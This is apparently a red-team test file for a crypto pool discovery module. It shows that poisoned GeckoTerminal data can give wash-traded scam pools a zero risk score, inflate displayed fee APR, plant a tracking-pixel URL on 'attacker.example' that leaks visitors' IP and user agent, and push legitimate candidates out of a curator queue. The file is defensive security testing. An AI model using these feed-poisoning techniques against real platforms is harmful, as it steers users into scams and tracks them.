// RED-TEAM PoC (off-chain, 2026-09-08) — feed poisoning via GeckoTerminal (MITM / compromised upstream /
// or simply an attacker who wash-trades 30 fake v4 "X / USDG" pools to the top of h24 volume).
// Passing = demonstrated.
import { describe, it, expect, vi, afterEach } from 'vitest'
import { poolToCandidate, discoverAndIngest } from '../discovery'
import { fakeSupabase } from './fakeSupabase'

const USDG = '0x5fc5360d0400a0fd4f2af552add042d716f1d168'
const CHAIN = 4663

function gtPool(i: number, over: Record<string, unknown> = {}) {
  return {
    attributes: {
      address: '0x' + i.toString(16).padStart(64, 'e'), // 32-byte v4 poolId shape
      name: `SCAM${i} / USDG 0.3%`,
      reserve_in_usd: '200000', // ≥150k → no TVL penalty
      volume_usd: { h24: '1000000' }, // vol/TVL 5 → no wash flag
      pool_created_at: new Date(Date.now() - 30 * 86_400_000).toISOString(), // 30d → no age penalty
      transactions: { h24: { buys: 500, sells: 500 } },
      ...over,
    },
    relationships: { dex: { data: { id: 'uniswap_v4' } }, base_token: { data: { id: `robinhood_0xscam${i}` } }, quote_token: { data: { id: `robinhood_${USDG}` } } },
  }
}

afterEach(() => vi.unstubAllGlobals())

describe('riskScore is fully attacker-steerable from GeckoTerminal-reported numbers', () => {
  it('a wash-traded fake pool scores 0 → UI shows green "Trust Low · 0"', () => {
    const c = poolToCandidate(gtPool(1), { usdgAddress: USDG })
    expect(c.verdict).toBe('review')
    expect(c.score).toBe(0)
    expect(c.reasons).toEqual([])
  })

  it('est. fee APR is inflated arbitrarily via the pair NAME’s fee suffix + tiny TVL (no bounds)', () => {
    const c = poolToCandidate(gtPool(2, { name: 'MOON / USDG 99%', reserve_in_usd: '1', volume_usd: { h24: '1000000000' } }), { usdgAddress: USDG })
    expect(c.feePct).toBe(99)
    expect(c.estFeeAprPct!).toBeGreaterThan(1e13) // rendered as "36,135,000,000,000%" on the Discover row
  })

  it('safeImg passes ANY https URL → third-party tracking pixel of every Discover visitor (IP/UA leak); CSP img-src is `https:`', () => {
    const tokens = new Map([[ 'robinhood_0xscam3', { id: 'robinhood_0xscam3', attributes: { symbol: 'SCAM', image_url: 'https://attacker.example/pixel.png?campaign=mintware' } } ]])
    const c = poolToCandidate(gtPool(3), { usdgAddress: USDG, tokensById: tokens })
    expect(c.baseLogo).toBe('https://attacker.example/pixel.png?campaign=mintware')
  })

  it('USDG detection falls back to the NAME when LP_GATEWAY_USDG is unset (prod: meta.usdg == null) → any pool named "…/ USDG" is eligible', () => {
    const c = poolToCandidate(gtPool(4, { name: 'NOTUSDG / USDG 0.3%' }), {}) // quote token id is irrelevant here
    expect(c.signals.usdgQuoted).toBe(true)
    expect(c.verdict).toBe('review')
  })
})

describe('prune-to-top-30 lets a hostile upstream EVICT every legitimate auto candidate from the curator queue', () => {
  it('30 attacker pools → all prior auto+pending rows not in the list are deleted', async () => {
    vi.stubGlobal('fetch', vi.fn(async () => ({ ok: true, json: async () => ({ data: Array.from({ length: 30 }, (_, i) => gtPool(100 + i)) }) })))
    const LEGIT = '0x' + 'ab'.repeat(32)
    const { db, client } = fakeSupabase({
      tables: {
        gateway_instances: [],
        gateway_pool_requests: [
          { id: 'legit', pool_address: LEGIT, chain_id: CHAIN, status: 'pending', source: 'auto', pair_label: 'REAL / USDG 0.3%' },
          { id: 'manual', pool_address: '0x' + 'cd'.repeat(32), chain_id: CHAIN, status: 'pending', source: 'manual' },
        ],
      },
    })
    const res = await discoverAndIngest({ supabase: client, chainId: CHAIN })
    expect(res.ingested).toBe(30)
    expect(res.pruned).toBe(1)
    expect(db.tables.gateway_pool_requests.find((r) => r.id === 'legit')).toBeUndefined() // ← legit candidate gone
    expect(db.tables.gateway_pool_requests.filter((r) => r.source === 'auto').length).toBe(30) // queue = attacker set
    expect(db.tables.gateway_pool_requests.find((r) => r.id === 'manual')).toBeDefined() // manual spam is never pruned
  })

  it('discoverAndIngest has NO fetch timeout (fetchHotPools has 6s) — a stalled upstream hangs the cron to the platform limit', async () => {
    let signalSeen: unknown = 'unset'
    vi.stubGlobal('fetch', vi.fn(async (_u: string, init?: { signal?: unknown }) => { signalSeen = init?.signal; return { ok: true, json: async () => ({ data: [] }) } }))
    const { client } = fakeSupabase({ tables: { gateway_instances: [], gateway_pool_requests: [] } })
    await discoverAndIngest({ supabase: client, chainId: CHAIN })
    expect(signalSeen).toBeUndefined() // no AbortSignal passed
  })
})
